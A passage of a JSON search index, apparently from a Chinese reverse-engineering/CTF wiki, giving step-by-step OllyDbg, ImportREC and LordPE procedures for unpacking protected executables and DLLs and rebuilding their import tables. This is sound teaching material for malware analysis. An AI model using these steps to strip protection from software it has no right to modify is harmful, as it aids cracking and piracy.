\u6211\u4eec\u5e78\u8fd0\u5730\u6765\u5230\u4e86OEP\u5904.", 
            "title": "\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u6cd5"
        }, 
        {
            "location": "/reverse/unpack/last-exception/#_1", 
            "text": "\u70b9\u51fb \u9009\u9879- \u8c03\u8bd5\u9009\u9879\u2014 \u5f02\u5e38 , \u628a\u91cc\u9762\u7684\u221a\u5168\u90e8\u53bb\u6389! \u6309\u4e0b CTRL+F2 \u91cd\u8f7d\u4e0b\u7a0b\u5e8f  \u5f00\u59cb\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u8df3\u8f6c, \u5728\u8fd9\u91cc\u6211\u4eec\u6309 SHIFT+F9 , \u76f4\u5230\u7a0b\u5e8f\u8fd0\u884c, \u8bb0\u4e0b\u4ece\u5f00\u59cb\u6309 SHIFT+F9 \u5230\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570 m !  CTRL+F2 \u91cd\u8f7d\u7a0b\u5e8f, \u6309 SHIFT+F9 (\u8fd9\u6b21\u6309\u7684\u6b21\u6570\u4e3a\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570 m-1 \u6b21)  \u5728OD\u7684\u53f3\u4e0b\u89d2\u6211\u4eec\u770b\u89c1\u6709\u4e00\u4e2a\" SE \u53e5\u67c4 \", \u8fd9\u65f6\u6211\u4eec\u6309 CTRL+G , \u8f93\u5165 SE \u53e5\u67c4 \u524d\u7684\u5730\u5740!  \u6309F2\u4e0b\u65ad\u70b9!\u7136\u540e\u6309 SHIFT+F9 \u6765\u5230\u65ad\u70b9\u5904, F8\u5355\u6b65\u8ddf\u8e2a", 
            "title": "\u8981\u70b9"
        }, 
        {
            "location": "/reverse/unpack/last-exception/#_2", 
            "text": "\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d:  5_last_exception.zip  OD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355 \u9009\u9879- \u8c03\u8bd5\u8bbe\u7f6e- \u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u53d6\u6d88\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38, \u7136\u540e\u91cd\u8f7d\u7a0b\u5e8f.   \u6211\u4eec\u6309\u4e0b Shift+F9 , \u8bb0\u5f55\u6309\u4e86\u591a\u5c11\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c. \u6211\u4eec\u8981\u5f97\u5230\u7684\u662f\u5012\u6570\u7b2c\u4e8c\u6b21\u6309\u4e0b\u662f\u6309\u4e86\u591a\u5c11\u6b21. \u5728\u672c\u4f8b\u4e2d   shift+F9 \u4e00\u6b21, \u5230\u4e86 0040CCD2 \u7684\u4f4d\u7f6e  shift+F9 \u4e24\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c   \u90a3\u4e48\u6211\u4eec\u91cd\u8f7d\u7a0b\u5e8f, \u53ea\u9700\u6309\u4e0b1\u6b21( 2-1=1 ) Shift+F9 , \u6765\u5230 0040CCD2 \u7684\u4f4d\u7f6e, \u89c2\u5bdf\u5806\u6808\u7a97\u53e3, \u8fd9\u91cc\u6709\u4e00\u4e2a SE\u5904\u7406\u7a0b\u5e8f: 0040CCD7   \u6211\u4eec\u5728CPU\u7a97\u53e3(\u6c47\u7f16\u6307\u4ee4), \u6309 Ctrl+G , \u8f93\u5165 0040CCD7 , \u7136\u540e\u5728\u6b64\u5904\u6309\u4e0bF2. \u4e5f\u5c31\u662f\u5728 0040CCD7 \u5904\u8bbe\u7f6e\u65ad\u70b9, \u7136\u540e\u6309\u4e0b Shift+F9 \u8fd0\u884c, \u89e6\u53d1\u65ad\u70b9.   \u89e6\u53d1\u65ad\u70b9\u540e, \u6765\u5355\u6b65\u8ddf\u8e2a. \u5411\u4e0b\u90fd\u662f\u4e00\u4e9b\u5faa\u73af\u548c\u8df3\u8f6c, \u6211\u4eec\u4f7f\u7528F4\u8df3\u8fc7\u5faa\u73af. \u6700\u540e\u5230\u8fbe\u5982\u4e0b\u4f4d\u7f6e   \u663e\u7136\u5728\u6700\u540e\u7684 mov ebp, 0041010CC; jmp ebp \u662f\u5728\u8df3\u8f6c\u5411OEP, \u6211\u4eec\u8df3\u8f6c\u8fc7\u53bb\u5982\u4e0b\u56fe\u6240\u793a:   \u663e\u7136, \u6211\u4eec\u5e78\u8fd0\u5730\u6765\u5230\u4e86OEP\u5904.", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/unpack/sfx/", 
            "text": "\"SFX\"\u6cd5\u5229\u7528\u4e86Ollydbg\u81ea\u5e26\u7684OEP\u5bfb\u627e\u529f\u80fd, \u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u8ba9\u7a0b\u5e8f\u505c\u5728OD\u627e\u5230\u7684OEP\u5904, \u6b64\u65f6\u58f3\u7684\u89e3\u538b\u8fc7\u7a0b\u5df2\u7ecf\u5b8c\u6bd5, \u53ef\u4ee5\u76f4\u63a5dump\u7a0b\u5e8f.\n\n\n\u8981\u70b9\n\n\n\n\n\u8bbe\u7f6eOD, \u5ffd\u7565\u6240\u6709\u5f02\u5e38, \u4e5f\u5c31\u662f\u8bf4\u5f02\u5e38\u9009\u9879\u5361\u91cc\u9762\u90fd\u6253\u4e0a\u52fe\n\n\n\u5207\u6362\u5230SFX\u9009\u9879\u5361, \u9009\u62e9\"\u5b57\u8282\u6a21\u5f0f\u8ddf\u8e2a\u5b9e\u9645\u5165\u53e3(\u901f\u5ea6\u975e\u5e38\u6162)\", \u786e\u5b9a\n\n\n\u91cd\u8f7d\u7a0b\u5e8f(\u5982\u679c\u8df3\u51fa\u662f\u5426\"\u538b\u7f29\u4ee3\u7801?\"\u9009\u62e9\"\u5426\", OD\u76f4\u63a5\u5230\u8fbeOEP)\n\n\n\n\n\u793a\u4f8b\n\n\n\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: \n6_sfx.zip\n\n\n\u9996\u5148\u6211\u4eec\u5728\u83dc\u5355\n\u9009\u9879-\n\u8c03\u8bd5\u8bbe\u7f6e-\n\u5f02\u5e38\u6807\u7b7e\u9875\n\u4e2d\u52fe\u9009\u6240\u6709\u5ffd\u7565\u5f02\u5e38.\n\n\n\n\n\u7136\u540e\u5207\u6362\u5230\nSFX\n\u6807\u7b7e\u9875, \u70b9\u9009\"\u5b57\u8282\u65b9\u5f0f\u8ddf\u8e2a\u771f\u6b63\u5165\u53e3\u5904(\u901f\u5ea6\u975e\u5e38\u6162)\"\n\n\n\n\n\u91cd\u8f7d\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u5df2\u7ecf\u505c\u5728\u4e86\u4ee3\u7801\u5165\u53e3\u70b9, \u5e76\u4e14\u4e5f\u4e0d\u9700\u8981\u5bf9OEP\u8fdb\u884c\u91cd\u65b0\u5206\u6790.", 
            "title": "SFX \u6cd5"
        }, 
        {
            "location": "/reverse/unpack/sfx/#_1", 
            "text": "\u8bbe\u7f6eOD, \u5ffd\u7565\u6240\u6709\u5f02\u5e38, \u4e5f\u5c31\u662f\u8bf4\u5f02\u5e38\u9009\u9879\u5361\u91cc\u9762\u90fd\u6253\u4e0a\u52fe  \u5207\u6362\u5230SFX\u9009\u9879\u5361, \u9009\u62e9\"\u5b57\u8282\u6a21\u5f0f\u8ddf\u8e2a\u5b9e\u9645\u5165\u53e3(\u901f\u5ea6\u975e\u5e38\u6162)\", \u786e\u5b9a  \u91cd\u8f7d\u7a0b\u5e8f(\u5982\u679c\u8df3\u51fa\u662f\u5426\"\u538b\u7f29\u4ee3\u7801?\"\u9009\u62e9\"\u5426\", OD\u76f4\u63a5\u5230\u8fbeOEP)", 
            "title": "\u8981\u70b9"
        }, 
        {
            "location": "/reverse/unpack/sfx/#_2", 
            "text": "\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d:  6_sfx.zip  \u9996\u5148\u6211\u4eec\u5728\u83dc\u5355 \u9009\u9879- \u8c03\u8bd5\u8bbe\u7f6e- \u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u52fe\u9009\u6240\u6709\u5ffd\u7565\u5f02\u5e38.   \u7136\u540e\u5207\u6362\u5230 SFX \u6807\u7b7e\u9875, \u70b9\u9009\"\u5b57\u8282\u65b9\u5f0f\u8ddf\u8e2a\u771f\u6b63\u5165\u53e3\u5904(\u901f\u5ea6\u975e\u5e38\u6162)\"   \u91cd\u8f7d\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u5df2\u7ecf\u505c\u5728\u4e86\u4ee3\u7801\u5165\u53e3\u70b9, \u5e76\u4e14\u4e5f\u4e0d\u9700\u8981\u5bf9OEP\u8fdb\u884c\u91cd\u65b0\u5206\u6790.", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/unpack/fix-iat/", 
            "text": "\u539f\u7406\n\n\n\u5728\u627e\u5230\u7a0b\u5e8fOEP\u540e, \u6211\u4eec\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765, \u5e76\u91cd\u5efa\nIAT\n. \nIAT\n\u5168\u540d\u662f\nImport Address Table\n, \u8868\u9879\u6307\u5411\u51fd\u6570\u5b9e\u9645\u5730\u5740. \n\n\n\u793a\u4f8b\n\n\n\u6bd4\u5982\u5982\u4e0b, \u6211\u4eec\u627e\u5230\u4e86OEP, \u5230\u8fbe\u4e86\u7a0b\u5e8f\u7684\u771f\u6b63\u5165\u53e3\u70b9. \u6211\u4eec\u8fd9\u65f6\u5c31\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765. \u6211\u4eec\u53f3\u952e, \u9009\u62e9\n\u7528OllyDump\u8131\u58f3\u8c03\u8bd5\u8fdb\u7a0b\n(\u4e0d\u8fc7\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\nLoadPE\n\u6765dump\u51fa\u6765):\n\n\n\n\n\u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3, \u770b\u4e00\u4e0b\u5730\u5740\u662f\u5426\u6b63\u786e, \u4e3b\u8981\u5c31\u662f\u770b\u770b\n\u5165\u53e3\u70b9\u5730\u5740\n\u6709\u6ca1\u6709\u9009\u5bf9. \u7136\u540e\u53d6\u6d88\u52fe\u9009\n\u91cd\u5efa\u8f93\u5165\u8868\n. \n\n\n\n\n\u5c06dump\u51fa\u7684\u6587\u4ef6\u547d\u540d, \u6211\u8fd9\u91cc\u662f\u547d\u540d\u4e3a\ndump.exe\n\u5566. \u6211\u4eec\u5c1d\u8bd5\u6765\u8fd0\u884c\u4e00\u4e0b\ndump.exe\n, \u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5bf9\u4e8e\u4e00\u4e9b\u7b80\u5355\u7684\u58f3, \u4f60dump\u51fa\u6765\u53d1\u73b0\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5982\u679c\u4f60\u786e\u5b9e\u627e\u5230\u4e86\u6b63\u786e\u7684OEP\u5e76\u7528\nIDA\n\u53cd\u7f16\u8bd1\u67e5\u770b\u7ed3\u679c\u826f\u597d, \u90a3\u4e48\u4f60\u7684\u7b2c\u4e00\u60f3\u6cd5\u5c31\u5e94\u8be5\u662f\u7a0b\u5e8f\u7684\nIAT\n\u51fa\u73b0\u4e86\u95ee\u9898. \u4f60\u5c31\u9700\u8981\u91cd\u5efa\nIAT\n.\n\n\n\u6211\u4eec\u9700\u8981\u4f7f\u7528\nImportREC\n\u6765\u5e2e\u52a9\u4fee\u590d\u8f93\u5165\u8868.\n\n\n\u6253\u5f00\nImportREC\n, \u9009\u62e9\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\n\u539f\u7248.exe\n(\n\u539f\u7248.exe\n\u662f\u6211\u5728OD\u4e2d\u6b63\u5728\u8c03\u8bd5\u7684\u8fdb\u7a0b, OD\u4e2d\u7684\nEIP\n\u6b63\u5904\u5728\nOEP\n\u4f4d\u7f6e, \u5728\u7528\nOllydump\n\u4e4b\u540e\u4e0d\u8981\u5173\u95ed\u8fd9\u4e2a\u8fdb\u7a0b\u54e6.). \nImportREC\n\u4fee\u590d\u8f93\u5165\u8868\u5165\u53e3\u70b9\u9700\u8981\u77e5\u9053\nOEP\n, \u4e5f\u5c31\u662f\u8981\u5728\u7a97\u53e3\u53f3\u4fa7\u4e2d\u95f4\u7684\nOEP\n\u8f93\u5165\u6846\u4e2d\u8fdb\u884c\u8f93\u5165\n\n\n\n\n\u6211\u4eec\u6240\u77e5, \u5728Ollydbg\u91cc\u6211\u4eec\u77e5\u9053\u7a0b\u5e8f\u76ee\u524d\u5728\u7684\u5165\u53e3\u70b9\u662f\n0049C25C\n, \u800c\u955c\u50cf\u57fa\u5740\u662f\n00400000\n\n\n\u56e0\u6b64\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u586b\u5199\nOEP\n\u662f\n0009C25C\n\n\n\u6211\u4eec\u4fee\u6539\nImportREC\n\u4e2d\u7684\nOEP\n\u4e3a\n0009C25C\n\u7136\u540e\u70b9\u51fb\nAutoSearch\n\u540e, \u5f39\u51fa\u63d0\u793a\u6846\"\u53d1\u73b0\u53ef\u80fd\u662f\u539fIAT\u5730\u5740\"\n\n\n\n\n\u6211\u4eec\u70b9\u51fb\nGet Imports\n\u6309\u94ae\u4fbf\u53ef\u4ee5\u91cd\u5efa\nIAT\n. \u5de6\u4fa7\u4f1a\u663e\u793a\nIAT\n\u4e2d\u5404\u5bfc\u5165\u51fd\u6570\u7684\u5730\u5740\u4ee5\u53ca\u662f\u5426\u6709\u6548. \u663e\u7136\u5728\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230\nImportREC\n\u627e\u5230\u4e86\u5185\u5b58\u4e2d\nIAT\n\u7684\u4f4d\u7f6e\u5e76\u68c0\u6d4b\u51fa\u5404\u4e2a\u51fd\u6570\u90fd\u662f\u6709\u6548\u7684. \n\n\n\n\n\u6211\u4eec\u70b9\u51fb\nFix Dump\n, \u7136\u540e\u6253\u5f00\u5148\u524d\u4f7f\u7528\nOllyDump\n\u63d2\u4ef6\u8f6c\u50a8\u51fa\u6765\u7684\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\ndump.exe\n\u6587\u4ef6\u3002\n\n\n\u90a3\u4e48\nImportREC\n\u5c31\u4f1a\u5e2e\u52a9\u6062\u590d\u5bfc\u5165\u8868\uff0c\u5e76\u751f\u6210\ndump_.exe\n\u6587\u4ef6. \ndump_.exe\n\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c", 
            "title": "DUMP \u53ca IAT \u91cd\u5efa"
        }, 
        {
            "location": "/reverse/unpack/fix-iat/#_1", 
            "text": "\u5728\u627e\u5230\u7a0b\u5e8fOEP\u540e, \u6211\u4eec\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765, \u5e76\u91cd\u5efa IAT .  IAT \u5168\u540d\u662f Import Address Table , \u8868\u9879\u6307\u5411\u51fd\u6570\u5b9e\u9645\u5730\u5740.", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/reverse/unpack/fix-iat/#_2", 
            "text": "\u6bd4\u5982\u5982\u4e0b, \u6211\u4eec\u627e\u5230\u4e86OEP, \u5230\u8fbe\u4e86\u7a0b\u5e8f\u7684\u771f\u6b63\u5165\u53e3\u70b9. \u6211\u4eec\u8fd9\u65f6\u5c31\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765. \u6211\u4eec\u53f3\u952e, \u9009\u62e9 \u7528OllyDump\u8131\u58f3\u8c03\u8bd5\u8fdb\u7a0b (\u4e0d\u8fc7\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 LoadPE \u6765dump\u51fa\u6765):   \u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3, \u770b\u4e00\u4e0b\u5730\u5740\u662f\u5426\u6b63\u786e, \u4e3b\u8981\u5c31\u662f\u770b\u770b \u5165\u53e3\u70b9\u5730\u5740 \u6709\u6ca1\u6709\u9009\u5bf9. \u7136\u540e\u53d6\u6d88\u52fe\u9009 \u91cd\u5efa\u8f93\u5165\u8868 .    \u5c06dump\u51fa\u7684\u6587\u4ef6\u547d\u540d, \u6211\u8fd9\u91cc\u662f\u547d\u540d\u4e3a dump.exe \u5566. \u6211\u4eec\u5c1d\u8bd5\u6765\u8fd0\u884c\u4e00\u4e0b dump.exe , \u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5bf9\u4e8e\u4e00\u4e9b\u7b80\u5355\u7684\u58f3, \u4f60dump\u51fa\u6765\u53d1\u73b0\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5982\u679c\u4f60\u786e\u5b9e\u627e\u5230\u4e86\u6b63\u786e\u7684OEP\u5e76\u7528 IDA \u53cd\u7f16\u8bd1\u67e5\u770b\u7ed3\u679c\u826f\u597d, \u90a3\u4e48\u4f60\u7684\u7b2c\u4e00\u60f3\u6cd5\u5c31\u5e94\u8be5\u662f\u7a0b\u5e8f\u7684 IAT \u51fa\u73b0\u4e86\u95ee\u9898. \u4f60\u5c31\u9700\u8981\u91cd\u5efa IAT .  \u6211\u4eec\u9700\u8981\u4f7f\u7528 ImportREC \u6765\u5e2e\u52a9\u4fee\u590d\u8f93\u5165\u8868.  \u6253\u5f00 ImportREC , \u9009\u62e9\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b \u539f\u7248.exe ( \u539f\u7248.exe \u662f\u6211\u5728OD\u4e2d\u6b63\u5728\u8c03\u8bd5\u7684\u8fdb\u7a0b, OD\u4e2d\u7684 EIP \u6b63\u5904\u5728 OEP \u4f4d\u7f6e, \u5728\u7528 Ollydump \u4e4b\u540e\u4e0d\u8981\u5173\u95ed\u8fd9\u4e2a\u8fdb\u7a0b\u54e6.).  ImportREC \u4fee\u590d\u8f93\u5165\u8868\u5165\u53e3\u70b9\u9700\u8981\u77e5\u9053 OEP , \u4e5f\u5c31\u662f\u8981\u5728\u7a97\u53e3\u53f3\u4fa7\u4e2d\u95f4\u7684 OEP \u8f93\u5165\u6846\u4e2d\u8fdb\u884c\u8f93\u5165   \u6211\u4eec\u6240\u77e5, \u5728Ollydbg\u91cc\u6211\u4eec\u77e5\u9053\u7a0b\u5e8f\u76ee\u524d\u5728\u7684\u5165\u53e3\u70b9\u662f 0049C25C , \u800c\u955c\u50cf\u57fa\u5740\u662f 00400000  \u56e0\u6b64\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u586b\u5199 OEP \u662f 0009C25C  \u6211\u4eec\u4fee\u6539 ImportREC \u4e2d\u7684 OEP \u4e3a 0009C25C \u7136\u540e\u70b9\u51fb AutoSearch \u540e, \u5f39\u51fa\u63d0\u793a\u6846\"\u53d1\u73b0\u53ef\u80fd\u662f\u539fIAT\u5730\u5740\"   \u6211\u4eec\u70b9\u51fb Get Imports \u6309\u94ae\u4fbf\u53ef\u4ee5\u91cd\u5efa IAT . \u5de6\u4fa7\u4f1a\u663e\u793a IAT \u4e2d\u5404\u5bfc\u5165\u51fd\u6570\u7684\u5730\u5740\u4ee5\u53ca\u662f\u5426\u6709\u6548. \u663e\u7136\u5728\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230 ImportREC \u627e\u5230\u4e86\u5185\u5b58\u4e2d IAT \u7684\u4f4d\u7f6e\u5e76\u68c0\u6d4b\u51fa\u5404\u4e2a\u51fd\u6570\u90fd\u662f\u6709\u6548\u7684.    \u6211\u4eec\u70b9\u51fb Fix Dump , \u7136\u540e\u6253\u5f00\u5148\u524d\u4f7f\u7528 OllyDump \u63d2\u4ef6\u8f6c\u50a8\u51fa\u6765\u7684\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f dump.exe \u6587\u4ef6\u3002  \u90a3\u4e48 ImportREC \u5c31\u4f1a\u5e2e\u52a9\u6062\u590d\u5bfc\u5165\u8868\uff0c\u5e76\u751f\u6210 dump_.exe \u6587\u4ef6.  dump_.exe \u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/unpack/manually-fix-iat/", 
            "text": "\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u6b64\u94fe\u63a5\u4e0b\u8f7d: \nmanually_fix_iat.zip\n\n\n\u6211\u4eec\u5e38\u7528\u7684\nImportREC\n\u8131\u58f3\u662f\u4f7f\u7528\u7684\u8f6f\u4ef6\u81ea\u5e26\u7684\nIAT auto search\n, \u4f46\u662f\u5982\u679c\u6211\u4eec\u8981\u624b\u52a8\u67e5\u627e\nIAT\n\u7684\u5730\u5740\u5e76\ndump\n\u51fa\u6765, \u53c8\u8be5\u600e\u4e48\u64cd\u4f5c\u5462\uff1f\n\n\n\u9996\u5148\u4f7f\u7528ESP\u5b9a\u5f8b, \u53ef\u4ee5\u5f88\u5feb\u5730\u8df3\u8f6c\u5230\nOEP: 00401110\n. \n\n\n\n\n\u6211\u4eec\u53f3\u952e\u70b9\u51fb, \u9009\u62e9\n\u67e5\u627e-\n\u6240\u6709\u6a21\u5757\u95f4\u7684\u8c03\u7528\n\n\n\n\n\u663e\u793a\u51fa\u8c03\u7528\u7684\u51fd\u6570\u5217\u8868, \u6211\u4eec\u53cc\u51fb\u5176\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570(\u6ce8\u610f\u8fd9\u91cc\u8981\u53cc\u51fb\u7684\u5e94\u8be5\u662f\u7a0b\u5e8f\u7684\u51fd\u6570\u800c\u4e0d\u662f\u7cfb\u7edf\u51fd\u6570)\n\n\n\n\n\u6211\u4eec\u6765\u5230\u4e86\u51fd\u6570\u8c03\u7528\u5904\n\n\n\n\n\u53f3\u952e\u70b9\u51fb\n\u8ddf\u968f\n, \u8fdb\u5165\u51fd\u6570\n\n\n\n\n\u7136\u540e\u518d\u53f3\u952e\u70b9\u51fb\n\u6570\u636e\u7a97\u53e3\u4e2d\u8ddf\u968f-\n\u5185\u5b58\u5730\u5740\n\n\n\n\n\u8fd9\u91cc\u56e0\u4e3a\u663e\u793a\u662f\u5341\u516d\u8fdb\u5236\u503c, \u4e0d\u65b9\u4fbf\u67e5\u770b, \u6211\u4eec\u53ef\u4ee5\u5728\u6570\u636e\u7a97\u53e3\u70b9\u51fb\u53f3\u952e\u9009\u62e9\n\u957f\u578b-\n\u5730\u5740\n, \u5c31\u53ef\u4ee5\u663e\u793a\u51fd\u6570\u540d\n\n\n\n\n\u6ce8\u610f\u6211\u4eec\u8981\u5411\u4e0a\u7ffb\u5230IAT\u8868\u7684\u8d77\u59cb\u4f4d\u7f6e, \u53ef\u4ee5\u770b\u5230\u6700\u5f00\u59cb\u7684\u51fd\u6570\u5730\u5740\u662f\n004050D8\n\u7684\nkernel.AddAtomA\n, \u6211\u4eec\u5411\u4e0b\u627e\u5230\u6700\u540e\u4e00\u4e2a\u51fd\u6570, \u4e5f\u5c31\u662f\nuser32.MessageBoxA\n\u51fd\u6570, \u8ba1\u7b97\u4e00\u4e0b\u6574\u4e2aIAT\u8868\u7684\u5927\u5c0f\u3002\u5728OD\u7684\u6700\u4e0b\u65b9\u6709\u663e\u793a\n\u5757\u5927\u5c0f\uff1a0x7C\n, \u6240\u4ee5\u6211\u4eec\u6574\u4e2aIAT\u5757\u5927\u5c0f\u5c31\u662f\n0x7C\n\n\n\n\n\u6253\u5f00\nImportREC\n, \u9009\u62e9\u6211\u4eec\u6b63\u5728\u8c03\u8bd5\u7684\u8fd9\u4e2a\u7a0b\u5e8f, \u7136\u540e\u5206\u522b\u8f93\u5165\nOEP\uff1a1110, RVA:50D8, SIZE:7C\n, \u7136\u540e\u70b9\u51fb\n\u83b7\u53d6\u8f93\u5165\u8868\n\n\n\n\n\u8fd9\u91cc\u5728\u8f93\u5165\u8868\u7a97\u53e3\u4e2d\u53f3\u952e\u9009\u62e9\n\u9ad8\u7ea7\u547d\u4ee4-\n\u9009\u62e9\u4ee3\u7801\u5757\n. \n\n\n\n\n\u7136\u540e\u4f1a\u5f39\u51fa\u7a97\u53e3, \u9009\u62e9\u5b8c\u6574\u8f6c\u50a8, \u4fdd\u5b58\u4e3a\ndump.exe\n\u6587\u4ef6\n\n\n\n\ndump\u5b8c\u6210\u540e, \u9009\u62e9\n\u8f6c\u50a8\u5230\u6587\u4ef6\n, \u8fd9\u91cc\u9009\u62e9\u4fee\u590d\u6211\u4eec\u521a\u521adump\u51fa\u7684dump.exe, \u5f97\u5230\u4e00\u4e2a\ndump\\_.exe\n. \u8fd9\u65f6\u6574\u4e2a\u8131\u58f3\u5c31\u5b8c\u6210\u4e86", 
            "title": "\u624b\u52a8\u67e5\u627e IAT \u5e76\u4f7f\u7528 ImportREC \u91cd\u5efa"
        }, 
        {
            "location": "/reverse/unpack/unpack-dll/", 
            "text": "\u8fd9\u91cc\u9700\u8981\u8054\u7cfb\u4e0a\u7bc7\u7684 \n\u624b\u52a8\u67e5\u627eIAT\u5e76\u4f7f\u7528ImportREC\u91cd\u5efa\n\n\n\u4f8b\u9898\u6587\u4ef6\u4f60\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: \nunpack_dll.zip\n\n\n\u56e0\u4e3a\nDll\n\u8131\u58f3\u9700\u8981\u8fd9\u4e00\u6b65\u9aa4. \nDll\n\u8131\u58f3\u7684\u6700\u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\n\u4f7f\u7528LordPE\u4fee\u6539\u5176Dll\u7684\u6807\u5fd7\n, \u7528\nLordPE\n\u6253\u5f00\nUnpackMe.dll\n, \u7136\u540e\u5728\u7279\u5f81\u503c\u90a3\u91cc\u70b9\u51fb\n...\n, \u7136\u540e\u53d6\u6d88\u52fe\u9009\nDLL\n\u6807\u5fd7, \u4fdd\u5b58\u540e, \u7cfb\u7edf\u5c31\u4f1a\u5c06\u8be5\u6587\u4ef6\u89c6\u4f5c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6.\n\n\n\n\n\u6211\u4eec\u5c06\nUnpackMe.dll\n\u540e\u7f00\u540d\u6539\u6210\nUnpackMe.exe\n, \u7136\u540e\u7528OD\u8f7d\u5165.\n\n\n\n\n\u4e00\u822c\u5728\u5165\u53e3\u70b9, \u7a0b\u5e8f\u90fd\u4f1a\u4fdd\u5b58\u4e00\u4e9b\u4fe1\u606f, \u8fd9\u91cc\u5c31\u5f88\u7b80\u5355, \u53ea\u4f5c\u4e86\u4e00\u4e2a\ncmp\n. \u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f, \u8fd9\u91cc\u7684\njnz\n\u8df3\u8f6c\u76f4\u63a5\u5c31\u8df3\u5230\u4e86\nunpacking\n\u8fc7\u7a0b\u7684\u672b\u5c3e. \u56e0\u6b64\u6211\u4eec\u9700\u8981\u4fee\u6539\u5bc4\u5b58\u5668\u7684\nz\n\u6807\u5fd7\u6765\u4f7f\u5f97\u8df3\u8f6c\u5931\u6548. \u540c\u65f6\u5728\nunpacking\n\u8fc7\u7a0b\u7684\u672b\u5c3e\u8bbe\u4e0b\u4e00\u4e2a\u65ad\u70b9\u4ee5\u907f\u514d\u8131\u58f3\u5b8c\u7136\u540e\u76f4\u63a5\u8fd0\u884c.(\u7a0b\u5e8f\u4f1a\u65ad\u5728\u8fd9\u4e2a\u65ad\u70b9\u4e0a, \u4f46\u662f\u8131\u58f3\u5df2\u7ecf\u5b8c\u6210, \u4ee3\u7801\u90fd\u5f88\u6e05\u6670)\n\n\nDll\n\u8131\u58f3\u7684\u57fa\u672c\u6b65\u9aa4\u8ddf\nexe\n\u6587\u4ef6\u8131\u58f3\u4e00\u6837, \u800c\u5728\u91cd\u5efa\nIAT\n\u65f6, \u9700\u8981\u7167\u7740\u4e0a\u7bc7 \n\u624b\u52a8\u67e5\u627eIAT\u5e76\u4f7f\u7528ImportREC\u91cd\u5efa\n \u6240\u8bf4\u7684\u90a3\u6837, \u624b\u52a8\u627e\u5230\nIAT\n\u8868\u5e76\u7528\nImportREC\n\u8fdb\u884c\u91cd\u5efa. \u53ea\u662f\u8981\u6ce8\u610f, \u5728\u8131\u58f3\u5b8cdump\u540e, \u8981\u8bb0\u5f97\u7528LordPE\u628a\nDLL\n\u6807\u5fd7\u6062\u590d\u8fc7\u6765\u5e76\u5c06\u6587\u4ef6\u540e\u7f00\u540d\u6539\u4e3a\n.dll\n.", 
            "title": "DLL \u6587\u4ef6\u8131\u58f3"
        }, 
        {
            "location": "/reverse/unicorn/introduction/", 
            "text": "Unicorn Engine\u7b80\u4ecb\n\n\n\u4ec0\u4e48\u662fUnicorn\u5f15\u64ce\n\n\nUnicorn\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7, \u591a\u5e73\u53f0, \u591a\u67b6\u6784\u7684CPU\u6a21\u62df\u5668\u6846\u67b6. \u6211\u4eec\u53ef\u4ee5\u66f4\u597d\u5730\u5173\u6ce8CPU\u64cd\u4f5c, \u5ffd\u7565\u673a\u5668\u8bbe\u5907\u7684\u5dee\u5f02. \u60f3\u8c61\u4e00\u4e0b, \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\u4e8e\u8fd9\u4e9b\u60c5\u666f: 